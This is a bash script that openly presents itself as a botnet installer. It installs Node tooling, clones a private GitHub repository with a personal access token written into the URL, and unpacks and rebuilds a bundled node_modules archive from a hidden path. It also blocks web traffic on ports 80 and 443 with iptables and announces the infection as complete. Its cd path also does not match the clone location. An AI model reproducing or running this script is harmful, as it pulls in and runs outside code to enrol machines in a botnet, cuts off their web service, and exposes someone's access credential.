#!/bin/bash
export DEBIAN_FRONTEND=noninteractive
clear
echo -e "\e[1;31m\n\n\n\n\nBotnets Infection On This Device, Waiting...\n\n\n\n\n\e[0m"
apt-get update -qq
apt-get upgrade -y -o Dpkg::Options::="--force-confnew"
apt-get install -y python3 curl build-essential npm iptables --no-install-recommends
curl -sL https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.5/install.sh | bash
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
nvm install node
npm install -g npm@latest
git clone https://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@github.com/annizayanti/private
cd /var/.trash/private
unzip node_modules.zip
rm -rf node_modules.zip
npm rebuild
chmod 777 *
sudo iptables -A INPUT -p tcp -m multiport --dports 80,443 -j DROP
sudo iptables -A OUTPUT -p tcp -m multiport --sports 80,443 -j DROP
clear
echo -e "\e[1;32m\n\n\n\n\nSUCCESS: F Botnets Infection Completed!\n\n\n\n\n\e[0m"

